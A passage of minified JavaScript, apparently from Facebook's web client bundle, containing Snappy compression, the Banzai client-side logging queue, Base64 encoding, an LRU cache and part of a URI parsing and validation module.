    c <= 60 ? (d[e] = c - 1 << 2, e += 1) : c < 256 ? (d[e] = 60 << 2, d[e + 1] = c - 1, e += 2) : (d[e] = 61 << 2, d[e + 1] = c - 1 & 255, d[e + 2] = c - 1 >>> 8, e += 3);
    r(a, b, d, e, c);
    return e + c;
  }
  function t(a, b, c, d) {
    if (d < 12 && c < 2048) {
      a[b] = 1 + (d - 4 << 2) + (c >>> 8 << 5);
      a[b + 1] = c & 255;
      return b + 2;
    } else {
      a[b] = 2 + (d - 1 << 2);
      a[b + 1] = c & 255;
      a[b + 2] = c >>> 8;
      return b + 3;
    }
  }
  function u(a, b, c, d) {
    while (d >= 68) b = t(a, b, c, 64), d -= 64;
    d > 64 && (b = t(a, b, c, 60), d -= 60);
    return t(a, b, c, d);
  }
  function v(a, b, c, d, e) {
    var f = 1;
    while (1 << f <= c && f <= m) f += 1;
    f -= 1;
    var g = 32 - f;
    typeof n[f] === "undefined" && (n[f] = new Uint16Array(1 << f));
    f = n[f];
    var h;
    for (h = 0; h < f.length; h++) f[h] = 0;
    h = b + c;
    var i = b,
      j = b,
      k,
      l,
      r,
      t,
      v,
      w = !0,
      x = 15;
    if (c >= x) {
      c = h - x;
      b += 1;
      x = o(p(a, b), g);
      while (w) {
        t = 32;
        l = b;
        do {
          b = l;
          k = x;
          v = t >>> 5;
          t += 1;
          l = b + v;
          if (b > c) {
            w = !1;
            break;
          }
          x = o(p(a, l), g);
          r = i + f[k];
          f[k] = b - i;
        } while (!q(a, b, r));
        if (!w) break;
        e = s(a, j, b - j, d, e);
        do {
          v = b;
          k = 4;
          while (b + k < h && a[b + k] === a[r + k]) k += 1;
          b += k;
          l = v - r;
          e = u(d, e, l, k);
          j = b;
          if (b >= c) {
            w = !1;
            break;
          }
          t = o(p(a, b - 1), g);
          f[t] = b - 1 - i;
          v = o(p(a, b), g);
          r = i + f[v];
          f[v] = b - i;
        } while (q(a, b, r));
        if (!w) break;
        b += 1;
        x = o(p(a, b), g);
      }
    }
    j < h && (e = s(a, j, h - j, d, e));
    return e;
  }
  function w(a, b, c) {
    do b[c] = a & 127, a = a >>> 7, a > 0 && (b[c] += 128), c += 1; while (a > 0);
    return c;
  }
  function x(a) {
    this.array = a;
  }
  x.prototype.maxCompressedLength = function () {
    var a = this.array.length;
    return 32 + a + Math.floor(a / 6);
  };
  x.prototype.compressToBuffer = function (a) {
    var b = this.array,
      c = b.length,
      d = 0,
      e = 0,
      f;
    e = w(c, a, e);
    while (d < c) f = Math.min(c - d, l), e = v(b, d, f, a, e), d += f;
    return e;
  };
  var y = [0, 255, 65535, 16777215, 4294967295];
  function r(a, b, c, d, e) {
    var f;
    for (f = 0; f < e; f++) c[d + f] = a[b + f];
  }
  function z(a, b, c, d) {
    var e;
    for (e = 0; e < d; e++) a[b + e] = a[b - c + e];
  }
  function A(a) {
    this.array = a, this.pos = 0;
  }
  A.prototype.readUncompressedLength = function () {
    var a = 0,
      b = 0,
      c,
      d;
    while (b < 32 && this.pos < this.array.length) {
      c = this.array[this.pos];
      this.pos += 1;
      d = c & 127;
      if (d << b >>> b !== d) return -1;
      a |= d << b;
      if (c < 128) return a;
      b += 7;
    }
    return -1;
  };
  A.prototype.uncompressToBuffer = function (a) {
    var b = this.array,
      c = b.length,
      d = this.pos,
      e = 0,
      f,
      g,
      h,
      i;
    while (d < b.length) {
      f = b[d];
      d += 1;
      if ((f & 3) === 0) {
        g = (f >>> 2) + 1;
        if (g > 60) {
          if (d + 3 >= c) return !1;
          h = g - 60;
          g = b[d] + (b[d + 1] << 8) + (b[d + 2] << 16) + (b[d + 3] << 24);
          g = (g & y[h]) + 1;
          d += h;
        }
        if (d + g > c) return !1;
        r(b, d, a, e, g);
        d += g;
        e += g;
      } else {
        switch (f & 3) {
          case 1:
            g = (f >>> 2 & 7) + 4;
            i = b[d] + (f >>> 5 << 8);
            d += 1;
            break;
          case 2:
            if (d + 1 >= c) return !1;
            g = (f >>> 2) + 1;
            i = b[d] + (b[d + 1] << 8);
            d += 2;
            break;
          case 3:
            if (d + 3 >= c) return !1;
            g = (f >>> 2) + 1;
            i = b[d] + (b[d + 1] << 8) + (b[d + 2] << 16) + (b[d + 3] << 24);
            d += 4;
            break;
          default:
            break;
        }
        if (i === 0 || i > e) return !1;
        z(a, e, i, g);
        e += g;
      }
    }
    return !0;
  };
  e.exports.uncompress = a;
  e.exports.compress = b;
}, null);
__d("SnappyCompressUtil", ["SnappyCompress"], function (a, b, c, d, e, f) {
  "use strict";

  var g = {
    compressUint8ArrayToSnappy: function (c) {
      if (c == null) return null;
      var d = null;
      try {
        d = b("SnappyCompress").compress(c);
      } catch (a) {
        return null;
      }
      c = "";
      for (var e = 0; e < d.length; e++) c += String.fromCharCode(d[e]);
      return a.btoa(c);
    },
    compressStringToSnappy: function (b) {
      if (a.Uint8Array === void 0 || a.btoa === void 0) return null;
      var c = new a.Uint8Array(b.length);
      for (var d = 0; d < b.length; d++) {
        var e = b.charCodeAt(d);
        if (e > 127) return null;
        c[d] = e;
      }
      return g.compressUint8ArrayToSnappy(c);
    },
    compressStringToSnappyBinary: function (c) {
      if (a.Uint8Array === void 0) return null;
      var d = null;
      if (a.TextEncoder !== void 0) d = new TextEncoder().encode(c);else {
        d = new a.Uint8Array(c.length);
        for (var e = 0; e < c.length; e++) {
          var f = c.charCodeAt(e);
          if (f > 127) return null;
          d[e] = f;
        }
      }
      f = null;
      try {
        f = b("SnappyCompress").compress(d);
      } catch (a) {
        return null;
      }
      return f;
    }
  };
  e.exports = g;
}, null);
__d("BanzaiCompressionUtils", ["FBLogger", "Promise", "SnappyCompressUtil", "once", "performanceNow"], function (a, b, c, d, e, f) {
  "use strict";

  var g,
    h = b("once")(function () {
      if (a.CompressionStream == null) return !1;
      if (a.Response == null) return !1;
      try {
        new a.CompressionStream("deflate");
      } catch (a) {
        return !1;
      }
      return !0;
    }),
    i = {
      compressWad: function (a, c) {
        if (a.needs_compression !== !0) {
          delete a.needs_compression;
          return;
        }
        if (c === "deflate") {
          i.compressWad(a, "snappy");
          return;
        }
        var d = (g || (g = b("performanceNow")))(),
          e = JSON.stringify(a.posts),
          f;
        switch (c) {
          case "snappy":
            f = b("SnappyCompressUtil").compressStringToSnappyBinary(e);
            break;
          case "snappy_base64":
            f = b("SnappyCompressUtil").compressStringToSnappy(e);
            break;
          default:
            break;
        }
        f != null && f.length < e.length ? (a.posts = f, a.compression = c, a.snappy_ms = Math.ceil((g || (g = b("performanceNow")))() - d), a.snappy_ms < 0 && b("FBLogger")("BanzaiCompressionUtils").warn("Expected positive snappy_ms but got %s", a.snappy_ms)) : a.compression = "";
        delete a.needs_compression;
      },
      compressWadAsync: function (c, d) {
        if (d !== "deflate") {
          i.compressWad(c, "snappy");
          return b("Promise").resolve();
        }
        if (!h()) return i.compressWadAsync(c, "snappy");
        var e = (g || (g = b("performanceNow")))(),
          f = JSON.stringify(c.posts),
          j = new Response(f).body;
        if (!j) {
          c.compression = "";
          delete c.needs_compression;
          return b("Promise").resolve();
        }
        j = j.pipeThrough(new a.CompressionStream("deflate"));
        return new Response(j).arrayBuffer().then(function (a) {
          a.byteLength < f.length ? (c.posts = new Uint8Array(a), c.compression = d, c.snappy_ms = Math.ceil((g || (g = b("performanceNow")))() - e), c.snappy_ms < 0 && b("FBLogger")("BanzaiCompressionUtils").warn("Expected positive snappy_ms but got %s", c.snappy_ms)) : c.compression = "", delete c.needs_compression;
        })["catch"](function () {
          c.compression = "", delete c.needs_compression;
        });
      },
      outOfBandsPosts: function (a) {
        var b = 0,
          c = {};
        for (var d = 0; d < a.length; d++) {
          var e = a[d],
            f = e.compression === "snappy" || e.compression === "deflate";
          if (f) {
            f = new Blob([e.posts], {
              type: "application/octet-stream"
            });
            e.posts = String(b);
            c["post_" + String(b)] = f;
            b++;
          }
        }
        return c;
      }
    };
  e.exports = i;
}, null);
__d("BanzaiBase", ["BanzaiAdapter", "BanzaiCompressionUtils", "BanzaiConsts", "BanzaiLazyQueue", "BanzaiUtils", "CurrentUser", "ErrorGuard", "ExecutionEnvironment", "FBLogger", "NavigationMetrics", "SetIdleTimeoutAcrossTransitions", "Visibility", "WebSession", "performanceAbsoluteNow"], function (a, b, c, d, e, f) {
  var g,
    h,
    i,
    j,
    k,
    l = [],
    m = null,
    n = {
      _clearPostBuffer: function () {
        l = [];
      },
      _flushLazyQueue: function () {
        b("BanzaiLazyQueue").flushQueue().forEach(function (a) {
          return n.post.apply(n, a);
        });
      },
      _gatherWadsAndPostsFromBuffer: function (a, c, d, e, f) {
        var g = {
          currentSize: 0,
          keepRetryable: d,
          overlimit: !1,
          sendMinimumOnePost: f,
          wadMap: new Map()
        };
        d = e.filter(function (d, e) {
          return b("BanzaiUtils").filterPost(d, a, c, g);
        });
        g.overlimit && d.length && n._schedule(0);
        return d;
      },
      _getEventTime: function () {
        return (g || (g = b("performanceAbsoluteNow")))();
      },
      _getWebSessionId: function () {
        return b("WebSession").getId();
      },
      _getPostBuffer: function () {
        return l;
      },
      _getUserId: function () {
        return b("CurrentUser").getPossiblyNonFacebookUserID();
      },
      _getAppId: function () {
        return b("CurrentUser").getAppID();
      },
      _initialize: function () {
        b("ExecutionEnvironment").canUseDOM && (n.adapter.useBeacon && b("Visibility").isSupported() ? (b("Visibility").addListener(b("Visibility").HIDDEN, function () {
          n._getPostBuffer().length > 0 && (n._tryToSendViaBeacon() || n._store(!1));
        }), n.isEnabled("enable_client_logging_clear_on_visible") && b("Visibility").addListener(b("Visibility").VISIBLE, function () {
          n._tryToSendViaBeacon() || n._restore(!1);
        })) : n.adapter.setHooks(n), n.adapter.setUnloadHook(n), b("NavigationMetrics").addListener(b("NavigationMetrics").Events.NAVIGATION_DONE, function (a, c) {
          if (c.pageType !== "normal") return;
          n._restore(!1);
          b("NavigationMetrics").removeCurrentListener();
        }));
      },
      _sendBeacon: function (b, c) {
        return a.navigator.sendBeacon(b, c);
      },
      _prepForTransit: function (a) {
        var c = new FormData();
        c.append("ts", String(Date.now()));
        var d = b("BanzaiCompressionUtils").outOfBandsPosts(a);
        Object.keys(d).forEach(function (a) {
          c.append(a, d[a]);
        });
        c.append("q", JSON.stringify(a));
        return c;
      },
      _prepWadForTransit: function (a) {
        b("BanzaiCompressionUtils").compressWad(a, b("BanzaiAdapter").preferredCompressionMethod());
      },
      _processCallbacksAndSendViaBeacon: function () {
        var a = [],
          c = [],
          d = [];
        n._gatherWadsAndPostsFromBuffer(c, d, !0, a, !1);
        if (c.length > 0) {
          c[0].send_method = "beacon";
          c.map(n._prepWadForTransit);
          d = n._prepForTransit(c);
          a = b("BanzaiAdapter").getEndPointUrl(!0);
          c = n._sendBeacon(a, d);
          c || b("FBLogger")("banzai").warn("Error sending beacon");
        }
      },
      _restore: function (a) {
        a = b("BanzaiAdapter").getStorage();
        var c = function (a) {
          l.push(a);
        };
        (h || (h = b("ErrorGuard"))).applyWithGuard(a.restore, a, [c]);
        n._schedule(b("BanzaiAdapter").config.RESTORE_WAIT || (i || (i = b("BanzaiConsts"))).VITAL_WAIT);
      },
      _schedule: function (a) {
        var c = n._getEventTime() + a;
        if (!k || c < k) {
          k = c;
          b("SetIdleTimeoutAcrossTransitions").clear(j);
          j = b("SetIdleTimeoutAcrossTransitions").start(b("BanzaiAdapter").wrapInTimeSlice(n._sendWithCallbacks, "Banzai.send"), a);
          return !0;
        }
        return !1;
      },
      _sendWithCallbacks: function (a, c) {
        k = null;
        n._schedule(n.BASIC.delay);
        if (!b("BanzaiAdapter").readyToSend()) {
          c && c();
          return;
        }
        if (n.isEnabled("flush_storage_periodically")) {
          var d = b("BanzaiAdapter").getStorage(),
            e = function () {
              n._restore(!1);
            };
          (h || (h = b("ErrorGuard"))).applyWithGuard(d.flush, d, [e]);
        }
        b("BanzaiAdapter").inform((i || (i = b("BanzaiConsts"))).SEND);
        d = [];
        var f = [];
        l = n._gatherWadsAndPostsFromBuffer(d, f, !0, l, !0);
        if (d.length <= 0) {
          b("BanzaiAdapter").inform((i || (i = b("BanzaiConsts"))).OK);
          a && a();
          return;
        }
        d[0].trigger = m;
        m = null;
        d[0].send_method = "ajax";
        d.map(n._prepWadForTransit);
        b("BanzaiAdapter").send(n._prepForTransit(d), function () {
          f.forEach(function (a) {
            a = a;
            a.__meta.status = (i || (i = b("BanzaiConsts"))).POST_SENT;
            a.__meta.callback && a.__meta.callback();
          }), a && a();
        }, function (a) {
          f.forEach(function (c) {
            b("BanzaiUtils").retryPost(c, a, l);
          }), c && c();
        });
      },
      _store: function (a) {
        a = b("BanzaiAdapter").getStorage();
        (h || (h = b("ErrorGuard"))).applyWithGuard(a.store, a, [l]);
      },
      _testState: function () {
        return {
          postBuffer: l,
          triggerRoute: m
        };
      },
      _tryToSendViaBeacon: function () {
        if (!(navigator && navigator.sendBeacon && b("BanzaiAdapter").isOkToSendViaBeacon())) return !1;
        var a = [],
          c = [];
        l = n._gatherWadsAndPostsFromBuffer(a, c, !1, l, !1);
        if (a.length <= 0) return !1;
        a[0].send_method = "beacon";
        a.map(n._prepWadForTransit);
        a = n._prepForTransit(a);
        var d = b("BanzaiAdapter").getEndPointUrl(!0);
        d = n._sendBeacon(d, a);
        if (!d) {
          c.forEach(function (a) {
            l.push(a);
          });
          return !1;
        }
        return !0;
      },
      _unload: function () {
        if (b("BanzaiAdapter").config.disabled) return;
        n._flushLazyQueue();
        navigator && navigator.sendBeacon && b("BanzaiAdapter").isOkToSendViaBeacon() && n._processCallbacksAndSendViaBeacon();
        b("BanzaiAdapter").cleanup();
        b("BanzaiAdapter").inform((i || (i = b("BanzaiConsts"))).SHUTDOWN);
        l.length > 0 && (!n.adapter.useBeacon || !n._tryToSendViaBeacon()) && n._store(!1);
      },
      BASIC: {
        delay: b("BanzaiAdapter").config.MAX_WAIT || (i || (i = b("BanzaiConsts"))).BASIC_WAIT
      },
      BASIC_WAIT: (i || (i = b("BanzaiConsts"))).BASIC_WAIT,
      ERROR: i.ERROR,
      OK: i.OK,
      SEND: i.SEND,
      SHUTDOWN: i.SHUTDOWN,
      VITAL: {
        delay: b("BanzaiAdapter").config.MIN_WAIT || (i || (i = b("BanzaiConsts"))).VITAL_WAIT
      },
      VITAL_WAIT: i.VITAL_WAIT,
      adapter: b("BanzaiAdapter"),
      canUseNavigatorBeacon: function () {
        return Boolean(navigator && navigator.sendBeacon && b("BanzaiAdapter").isOkToSendViaBeacon());
      },
      flush: function (a, c) {
        b("SetIdleTimeoutAcrossTransitions").clear(j), n._sendWithCallbacks(a, c);
      },
      isEnabled: function (a) {
        return Boolean(b("BanzaiAdapter").config.gks && b("BanzaiAdapter").config.gks[a] && !b("BanzaiAdapter").config.disabled);
      },
      post: function (a, c, d) {
        a || b("FBLogger")("banzai").mustfix("Banzai.post called without specifying a route");
        n._flushLazyQueue();
        var e = a.split(":");
        if ((b("BanzaiAdapter").config.known_routes || []).indexOf(e[0]) === -1) {
          b("BanzaiAdapter").config.should_log_unknown_routes === !0 && b("FBLogger")("banzai").blameToPreviousFrame().mustfix("Attempted to post to invalid Banzai route '" + a + "'. This call site should be cleaned up.");
          if (b("BanzaiAdapter").config.should_drop_unknown_routes === !0) return;
        }
        var f = "";
        try {
          var g;
          f = (g = JSON.stringify(c)) != null ? g : "";
        } catch (c) {
          b("FBLogger")("banzai").catching(c).addToCategoryKey(a).mustfix("Could not JSON.stringify banzai data for route %s", a);
          return;
        }
        var h = d == null ? void 0 : d.retry;
        if (b("BanzaiAdapter").config.disabled) return;
        if (!b("ExecutionEnvironment").canUseDOM && !b("ExecutionEnvironment").isInWorker) return;
        var j = n.adapter.getTopLevel();
        if (j) {
          var k;
          try {
            k = j.require("Banzai");
          } catch (a) {
            k = null;
          }
          if (k) {
            k.post.apply(k, arguments);
            return;
          }
        }
        var o = b("BanzaiAdapter").config.blacklist;
        if (o && o.indexOf && typeof o.indexOf == "function" && o.indexOf(a) != -1) return;
        var p = f.length,
          q = b("BanzaiUtils").wrapData(a, c, n._getEventTime(), h, p),
          r = q;
        (d == null ? void 0 : d.callback) && (r.__meta.callback = d == null ? void 0 : d.callback);
        (d == null ? void 0 : d.compress) != null && (r.__meta.compress = d == null ? void 0 : d.compress);
        var s = d == null ? void 0 : d.delay;
        s == null && (s = (i || (i = b("BanzaiConsts"))).BASIC_WAIT);
        if (d == null ? void 0 : d.signal) {
          r.__meta.status = (i || (i = b("BanzaiConsts"))).POST_INFLIGHT;
          var t = [{
            user: n._getUserId(),
            webSessionId: n._getWebSessionId(),
            app_id: n._getAppId(),
            posts: [q],
            trigger: a
          }];
          b("BanzaiAdapter").send(n._prepForTransit(t), function () {
            r.__meta.status = (i || (i = b("BanzaiConsts"))).POST_SENT, r.__meta.callback && r.__meta.callback();
          }, function (a) {
            b("BanzaiUtils").retryPost(q, a, l);
          }, !0);
          if (!h) return;
        }
        l.push(q);
        (n._schedule(s) || !m) && (m = a);
      },
      subscribe: b("BanzaiAdapter").subscribe
    };
  n._initialize();
  e.exports = n;
}, null);
__d("Base64", [], function (a, b, c, d, e, f) {
  var g = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  function h(a) {
    a = a.charCodeAt(0) << 16 | a.charCodeAt(1) << 8 | a.charCodeAt(2);
    return String.fromCharCode(g.charCodeAt(a >>> 18), g.charCodeAt(a >>> 12 & 63), g.charCodeAt(a >>> 6 & 63), g.charCodeAt(a & 63));
  }
  var i = ">___?456789:;<=_______\0\x01\x02\x03\x04\x05\x06\x07\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19______\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123";
  function j(a) {
    a = i.charCodeAt(a.charCodeAt(0) - 43) << 18 | i.charCodeAt(a.charCodeAt(1) - 43) << 12 | i.charCodeAt(a.charCodeAt(2) - 43) << 6 | i.charCodeAt(a.charCodeAt(3) - 43);
    return String.fromCharCode(a >>> 16, a >>> 8 & 255, a & 255);
  }
  var k = {
    encode: function (a) {
      a = unescape(encodeURI(a));
      var b = (a.length + 2) % 3;
      a = (a + "\0\0".slice(b)).replace(/[\s\S]{3}/g, h);
      return a.slice(0, a.length + b - 2) + "==".slice(b);
    },
    decode: function (a) {
      a = a.replace(/[^A-Za-z0-9+\/]/g, "");
      var b = a.length + 3 & 3;
      a = (a + "AAA".slice(b)).replace(/..../g, j);
      a = a.slice(0, a.length + b - 3);
      try {
        return decodeURIComponent(escape(a));
      } catch (a) {
        throw new Error("Not valid UTF-8");
      }
    },
    encodeObject: function (a) {
      return k.encode(JSON.stringify(a));
    },
    decodeObject: function (a) {
      return JSON.parse(k.decode(a));
    },
    encodeNums: function (a) {
      return String.fromCharCode.apply(String, a.map(function (a) {
        return g.charCodeAt((a | -(a > 63 ? 1 : 0)) & -(a > 0 ? 1 : 0) & 63);
      }));
    }
  };
  a = k;
  f["default"] = a;
}, 66);
__d("CometLruCache", ["recoverableViolation"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = function () {
    function a(a) {
      this.$1 = a, a <= 0 && c("recoverableViolation")("CometLruCache: Unable to create instance of cache with zero or negative capacity.", "CometLruCache"), this.$2 = new Map();
    }
    var b = a.prototype;
    b.set = function (a, b) {
      this.$2["delete"](a);
      this.$2.set(a, b);
      if (this.$2.size > this.$1) {
        a = this.$2.keys().next();
        a.done || this.$2["delete"](a.value);
      }
    };
    b.get = function (a) {
      var b = this.$2.get(a);
      b != null && (this.$2["delete"](a), this.$2.set(a, b));
      return b;
    };
    b.has = function (a) {
      return this.$2.has(a);
    };
    b["delete"] = function (a) {
      this.$2["delete"](a);
    };
    b.size = function () {
      return this.$2.size;
    };
    b.capacity = function () {
      return this.$1 - this.$2.size;
    };
    b.clear = function () {
      this.$2.clear();
    };
    return a;
  }();
  function a(a) {
    return new h(a);
  }
  g.create = a;
}, 98);
__d("ConstUriUtils", ["CometLruCache", "ExecutionEnvironment", "FBLogger", "PHPQuerySerializer", "PHPQuerySerializerNoEncoding", "URIRFC3986", "URISchemes", "UriNeedRawQuerySVConfig", "isSameOrigin", "recoverableViolation", "structuredClone"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = d("CometLruCache").create(5e3),
    i = new RegExp("(^|\\.)facebook\\.com$", "i"),
    j = new RegExp("^(?:[^/]*:|[\\x00-\\x1f]*/[\\x00-\\x1f]*/)"),
    k = new RegExp("[\\x00-\\x2c\\x2f\\x3b-\\x40\\x5c\\x5e\\x60\\x7b-\\x7f\\uFDD0-\\uFDEF\\uFFF0-\\uFFFF\\u2047\\u2048\\uFE56\\uFE5F\\uFF03\\uFF0F\\uFF1F]"),
    l = c("UriNeedRawQuerySVConfig").uris.map(function (a) {
      return {
        domain: a,
        valid: r(a)
      };
    }),
    m = [];
  function n(a, b) {
    var d = {};
    if (a != null) for (var a = a.entries(), e = Array.isArray(a), f = 0, a = e ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
      var g;
      if (e) {
        if (f >= a.length) break;
        g = a[f++];
      } else {
        f = a.next();
        if (f.done) break;
        g = f.value;
      }
      g = g;
      d[g[0]] = g[1];
    } else c("FBLogger")("ConstUriUtils").warn("Passed a null query map in, this means poor client side flow coverage or client/server boundary type issue.");
    return b.serialize(d);
  }
  function o(a, b, d) {
    var e = c("PHPQuerySerializer");
    if (["http", "https"].includes(b) && p(a)) {
      if (a.includes("doubleclick.net") && d != null && !d.startsWith("http")) return e;
      e = c("PHPQuerySerializerNoEncoding");
    }
    return e;
  }
  function p(a) {
    return a != null && l.some(function (b) {
      return b.valid && q(a, b.domain);
    });
  }
  function q(a, b) {
    if (b === "" || a === "") return !1;
    if (a.endsWith(b)) {
      b = a.length - b.length - 1;
      if (b === -1 || a[b] === ".") return !0;
    }
    return !1;
  }
  function r(a) {
    return !k.test(a);
  }
  function s(a, b) {
    var c = b.protocol != null && b.protocol !== "" ? b.protocol : a.getProtocol();
    c = b.domain != null ? o(b.domain, c) : a.getSerializer();
    c = {
      domain: a.getDomain(),
      fragment: a.getFragment(),
      fragmentSeparator: a.hasFragmentSeparator(),
      isGeneric: a.isGeneric(),
      originalRawQuery: a.getOriginalRawQuery(),
      path: a.getPath(),
      port: a.getPort(),
      protocol: a.getProtocol(),
      queryParams: a.getQueryParams(),
      serializer: c,
      subdomain: a.getSubdomain()
    };
    a = babelHelpers["extends"]({}, c, b);
    c = b.queryParams != null && b.queryParams.size !== 0;
    return x.getUribyObject(a, c);
  }
  function t(a, b, c, d) {
    c === void 0 && (c = !1);
    var e = a.protocol !== "" ? a.protocol + ":" + (a.isGeneric ? "" : "//") : "",
      f = a.domain !== "" ? a.domain : "",
      g = a.port !== "" ? ":" + a.port : "",
      h = a.path !== "" ? a.path : e !== "" && e !== "mailto:" || f !== "" || g !== "" ? "/" : "";
    c = u(f, a.originalRawQuery, a.queryParams, b, c, (b = d) != null ? b : a.serializer);
    d = c.length > 0 ? "?" : "";
    b = a.fragment !== "" ? "#" + a.fragment : "";
    a = a.fragment === "" && a.fragmentSeparator ? "#" : "";
    return "" + e + f + g + h + d + c + a + b;
  }
  function u(a, b, c, d, e, f) {
    e === void 0 && (e = !1);
    if (!d && (e || p(a))) {
      return (d = b) != null ? d : "";
    }
    return n(c, f);
  }
  function v(a) {
    var b = a.trim();
    b = d("URIRFC3986").parse(b) || {
      fragment: null,
      host: null,
      isGenericURI: !1,
      query: null,
      scheme: null,
      userinfo: null
    };
    var c = b.host || "",
      e = c.split(".");
    e = e.length >= 3 ? e[0] : "";
    var f = o(c, b.scheme || "", b.query),
      g = f.deserialize(b.query || "") || {};
    g = new Map(Object.entries(g));
    g = w({
      domain: c,
      fragment: b.fragment || "",
      fragmentSeparator: b.fragment === "",
      isGeneric: b.isGenericURI,
      originalRawQuery: b.query,
      path: b.path || "",
      port: b.port != null ? String(b.port) : "",
      protocol: (b.scheme || "").toLowerCase(),
      queryParams: g,
      serializer: f,
      subdomain: e,
      userInfo: (c = b == null ? void 0 : b.userinfo) != null ? c : ""
    }, a);
    return g;
  }
  function w(a, b, c, e) {
    c === void 0 && (c = d("URISchemes").Options.INCLUDE_DEFAULTS);
    var f = {
        components: babelHelpers["extends"]({}, a),
        error: "",
        valid: !0
      },
      g = f.components;
    if (!d("URISchemes").isAllowed(a.protocol, c, e)) {
      f.valid = !1;
      f.error = 'The URI protocol "' + String(a.protocol) + '" is not allowed.';
      return f;
    }
    if (!r(a.domain || "")) {
      f.valid = !1;
      f.error = "This is an unsafe domain " + String(a.domain);
      return f;
    }
    g.port = a.port != null && String(a.port) || "";
    if (Boolean(a.userInfo)) {
      f.valid = !1;
      f.error = "Invalid URI: (userinfo is not allowed in a URI " + String(a.userInfo) + ")";
      return f;
    }
    c = b != null && b !== "" ? b : t(g, !1);
    if (g.domain === "" && g.path.indexOf("\\") !== -1) {
      f.valid = !1;
      f.error = "Invalid URI: (no domain but multiple back-slashes " + c + ")";
      return f;
    }
    if (!g.protocol && j.test(c)) {
      f.valid = !1;
      f.error = "Invalid URI: (unsafe protocol-relative URI " + c + ")";
      return f;
    }
    if (g.domain !== "" && g.path !== "" && !g.path.startsWith("/")) {
      f.valid = !1;
      f.error = "Invalid URI: (domain and pathwhere path lacks leading slash " + c + ")";
      return f;
    }
    return f;
  }
  var x = function () {
    function a(a) {
      this.queryParams = new Map(), this.domain = a.domain, this.fragment = a.fragment, this.fragmentSeparator = Boolean(a.fragmentSeparator), this.isGenericProtocol = Boolean(a.isGeneric), this.path = a.path, this.originalRawQuery = a.originalRawQuery, this.port = a.port, this.protocol = a.protocol, this.queryParams = a.queryParams, this.serializer = a.serializer, this.subdomain = a.subdomain;
    }
    var b = a.prototype;
    b.addQueryParam = function (a, b) {
      if (Boolean(a)) {
        var c = this.getQueryParams();
        c.set(a, b);
        return s(this, {
          queryParams: c
        });
      }
      return this;
    };
    b.addQueryParams = function (a) {
      if (a.size > 0) {
        var b = this.getQueryParams();
        a.forEach(function (a, c) {
          b.set(c, a);
        });
        return s(this, {
          queryParams: b
        });
      }
      return this;
    };
    b.addQueryParamString = function (a) {
      if (Boolean(a)) {
        a = a.startsWith("?") ? a.slice(1) : a;
        var b = this.getQueryParams();
        a.split("&").map(function (a) {
          a = a.split("=");
          var c = a[0];
          a = a[1];
          b.set(c, a);
        });
        return s(this, {
          queryParams: b
        });
      }
      return this;
    };
    b.addTrailingSlash = function () {
      var a = this.getPath();
      return a.length > 0 && a[a.length - 1] !== "/" ? this.setPath(a + "/") : this;
    };
    b.getDomain = function () {
      return this.domain;
    };
    b.getFragment = function () {
      return this.fragment;
    };
    b.getOrigin = function () {
      var a = this.getPort();
      return this.getProtocol() + "://" + this.getDomain() + (a ? ":" + a : "");
    };
    b.getOriginalRawQuery = function () {
      return this.originalRawQuery;
    };
    b.getPath = function () {
      return this.path;
    };
    b.getPort = function () {
      return this.port;
    };
    b.getProtocol = function () {
      return this.protocol.toLowerCase();
    };
    b.getQualifiedUri = function () {
      if (!this.getDomain()) {
        var b = (typeof window !== "undefined" ? window : self).location.href;
        c("ExecutionEnvironment").isInWorker && b && b.startsWith("blob:") && (b = b.substring(5, b.length));
        b = b.slice(0, b.indexOf("/", b.indexOf(":") + 3));
        return a.getUri(b + this.toString());
      }
      return this;
    };
    b.getQueryParam = function (a) {
      a = this.queryParams.get(a);
      if (typeof a === "string") return a;else {
        a = JSON.stringify(a);
        return a == null ? a : JSON.parse(a);
      }
    };
    b.getQueryData = function () {
      return Object.fromEntries(this.getQueryParams());
    };
    b.getQueryParams = function () {
      if (c("structuredClone") != null) return c("structuredClone")(this.queryParams);
      var a = JSON.stringify(Array.from(this.queryParams), function (a, b) {
        return Array.isArray(b) ? {
          __CUUArr: !0,
          value: babelHelpers["extends"]({}, b)
        } : b;
      });
      a = JSON.parse(a, function (a, b) {
        return b != null && typeof b === "object" && b.__CUUArr ? Object.keys(b.value).reduce(function (a, c) {
          a[c] = b.value[c];
          return a;
        }, []) : b;
      });
      return new Map(a);
    };
    b.getQueryString = function (a) {
      a === void 0 && (a = !1);
      return u(this.domain, this.originalRawQuery, this.queryParams, !1, a, this.serializer);
    };
    b.getRegisteredDomain = function () {
      if (!this.getDomain()) return "";
      if (!this.isFacebookUri()) return null;
      var a = this.getDomain().split("."),
        b = a.indexOf("facebook");
      b === -1 && (b = a.indexOf("workplace"));
      return a.slice(b).join(".");
    };
    b.getSerializer = function () {
      return this.serializer;
    };
    b.getSubdomain = function () {
      return this.subdomain;
    };
    b.getUnqualifiedUri = function () {
      if (this.getDomain()) {
        var b = this.toString();
        return a.getUri(b.slice(b.indexOf("/", b.indexOf(":") + 3)));
      }
      return this;
    };
    a.getUri = function (b) {
      b = b.trim();
      var d = h.get(b);
      if (d == null) {
        var e = v(b);
        if (e.valid) d = new a(e.components), h.set(b, d);else {
          c("FBLogger")("ConstUriUtils").blameToPreviousFrame().warn(e.error);
          return null;
        }
      }
      return d;
    };
    a.getUribyObject = function (b, d) {
      var e = t(b, d),
        f = h.get(e);
      if (f == null) {
        d && (b.originalRawQuery = n(b.queryParams, b.serializer));
        d = w(b);
        if (d.valid) f = new a(d.components), h.set(e, f);else {
          c("recoverableViolation")(d.error, "ConstUri");
          return null;
        }
      }
      return f;
    };
    b.hasFragmentSeparator = function () {
      return this.fragmentSeparator;
    };
    b.isEmpty = function () {
      return !(this.getPath() || this.getProtocol() || this.getDomain() || this.getPort() || this.queryParams.size > 0 || this.getFragment());
    };
    b.isFacebookUri = function () {
      var a = this.toString();
      if (a === "") return !1;
      return !this.getDomain() && !this.getProtocol() ? !0 : ["https", "http"].indexOf(this.getProtocol()) !== -1 && i.test(this.getDomain());
    };
    b.isGeneric = function () {
      return this.isGenericProtocol;
